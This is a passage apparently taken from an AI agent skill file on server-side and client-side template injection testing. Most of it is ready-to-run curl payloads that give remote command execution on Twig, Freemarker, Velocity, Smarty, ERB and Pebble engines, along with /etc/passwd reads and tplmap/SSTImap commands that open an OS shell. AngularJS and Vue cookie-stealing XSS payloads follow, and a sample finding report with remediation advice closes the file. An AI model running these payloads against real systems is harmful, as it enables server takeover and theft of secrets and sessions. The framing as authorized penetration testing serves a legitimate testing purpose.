---
name: webapp-injection-ssti-template
description: - During authorized penetration tests when user input is rendered through a server-side template engine - When testing error pages, email templates, PDF generators, or report builders that include user-supplied data - For assessing applications that allow users to customize templates or notification messages - When identifying potential SSTI in par
domain: cybersecurity
---
Twig (PHP) ---
# RCE via Twig
curl -s "https://target.example.com/page?name={{['id']|filter('system')}}"
curl -s "https://target.example.com/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Twig file read
curl -s "https://target.example.com/page?name={{'/etc/passwd'|file_excerpt(1,30)}}"

# --- Freemarker (Java) ---
# RCE via Freemarker
curl -s "https://target.example.com/page?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# Alternative Freemarker RCE
curl -s "https://target.example.com/page?name=\${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}"

# --- Velocity (Java) ---
# RCE via Velocity
curl -s "https://target.example.com/page?name=%23set(%24e=%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22id%22)"

# --- Smarty (PHP) ---
# RCE via Smarty
curl -s "https://target.example.com/page?name={system('id')}"

# --- ERB (Ruby) ---
# RCE via ERB
curl -s "https://target.example.com/page?name=<%25=%20system('id')%20%25>"

# --- Pebble (Java) ---
# RCE via Pebble
curl -s "https://target.example.com/page?name={%25%20set%20cmd%20=%20'id'%20%25}{{['java.lang.Runtime']|first.getRuntime().exec(cmd)}}"
```

### Step 5: Automate with tplmap and SSTImap

Use automated tools for comprehensive testing and exploitation.

```bash
# tplmap - Automated SSTI exploitation
python3 tplmap.py -u "https://target.example.com/page?name=test" --os-shell

# tplmap with POST parameter
python3 tplmap.py -u "https://target.example.com/page" -d "name=test" --os-cmd "id"

# tplmap with custom headers
python3 tplmap.py -u "https://target.example.com/page?name=test" \
  -H "Cookie: session=abc123" \
  -H "Authorization: Bearer token" \
  --os-cmd "whoami"

# SSTImap
sstimap -u "https://target.example.com/page?name=test"
sstimap -u "https://target.example.com/page?name=test" --os-shell

# tplmap file read
python3 tplmap.py -u "https://target.example.com/page?name=test" \
  --download "/etc/passwd" "/tmp/passwd"

# Burp Intruder approach:
# 1. Send request to Intruder
# 2. Mark the injectable parameter
# 3. Load SSTI payload list
# 4. Grep for indicators: "49", error messages, class names
```

### Step 6: Test Client-Side Template Injection (CSTI)

Assess for Angular/Vue/React expression injection in client-side templates.

```bash
# AngularJS expression injection
curl -s "https://target.example.com/page?name={{constructor.constructor('alert(1)')()}}"

# AngularJS sandbox bypass (pre-1.6)
curl -s "https://target.example.com/page?name={{a]constructor.prototype.charAt=[].join;[\$eval('a]alert(1)//')]()}}"

# Vue.js expression injection
curl -s "https://target.example.com/page?name={{_c.constructor('alert(1)')()}}"

# Check for AngularJS ng-app on the page
curl -s "https://target.example.com/" | grep -i "ng-app\|angular\|vue\|v-"

# Test with different CSTI payloads
for payload in '{{7*7}}' '{{constructor.constructor("return this")()}}' \
  '{{$on.constructor("alert(1)")()}}'; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  echo -n "$payload: "
  curl -s "https://target.example.com/search?q=$encoded" | grep -oP "49|alert|constructor"
done
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **SSTI** | Server-Side Template Injection - injecting template directives that execute server-side |
| **CSTI** | Client-Side Template Injection - injecting expressions into AngularJS/Vue templates (leads to XSS) |
| **Template Engine** | Software that processes template files with placeholders, replacing them with data |
| **Sandbox Escape** | Bypassing template engine security restrictions to access dangerous functions |
| **MRO (Method Resolution Order)** | Python class hierarchy traversal used in Jinja2 exploitation |
| **Object Introspection** | Using `__class__`, `__subclasses__()`, `__globals__` to navigate Python objects |
| **Blind SSTI** | Template injection where output is not directly visible, requiring OOB techniques |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **tplmap** | Automated SSTI detection and exploitation with OS shell capability |
| **SSTImap** | Modern SSTI scanner with support for multiple template engines |
| **Burp Suite Professional** | Request interception and Intruder for payload fuzzing |
| **Hackvertor (Burp Extension)** | Payload encoding and transformation for bypass techniques |
| **PayloadsAllTheThings** | Comprehensive SSTI payload reference on GitHub |
| **OWASP ZAP** | Automated SSTI detection in active scanning mode |

## Common Scenarios

### Scenario 1: Flask Email Template Injection
A Flask application lets users customize email notification templates. The custom template is rendered with Jinja2 without sandboxing, allowing RCE through `{{config.items()}}` and subclass traversal.

### Scenario 2: Java CMS Freemarker Injection
A Java-based CMS allows administrators to edit page templates using Freemarker. A lower-privileged editor injects `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` to execute commands.

### Scenario 3: Error Page SSTI
A custom 404 error page reflects the requested URL path through a Twig template. Requesting `/{{['id']|filter('system')}}` causes the server to execute the `id` command.

### Scenario 4: AngularJS Client-Side Injection
A search page renders results using AngularJS with `ng-bind-html`. Searching for `{{constructor.constructor('alert(document.cookie)')()}}` achieves XSS through AngularJS expression evaluation.

## Output Format

```
## Template Injection Finding

**Vulnerability**: Server-Side Template Injection (Jinja2) - RCE
**Severity**: Critical (CVSS 9.8)
**Location**: GET /page?name= (name parameter)
**Template Engine**: Jinja2 (Python 3.9 / Flask 2.3)
**OWASP Category**: A03:2021 - Injection

### Reproduction Steps
1. Send GET /page?name={{7*7}} - Response contains "49" confirming SSTI
2. Send GET /page?name={{config.SECRET_KEY}} - Returns Flask secret key
3. Send GET /page?name={{cycler.__init__.__globals__.os.popen('id').read()}}
4. Server returns: uid=33(www-data) gid=33(www-data)

### Confirmed Impact
- Remote code execution as www-data user
- Secret key disclosure: Flask SECRET_KEY exposed
- File system read: /etc/passwd, application source code
- Potential lateral movement to internal network

### Recommendation
1. Never pass user input directly to template render functions
2. Use a sandboxed template environment (Jinja2 SandboxedEnvironment)
3. Implement strict input validation and allowlisting for template variables
4. Use logic-less template engines (Mustache, Handlebars) where possible
5. Apply least-privilege OS permissions for the web application user
```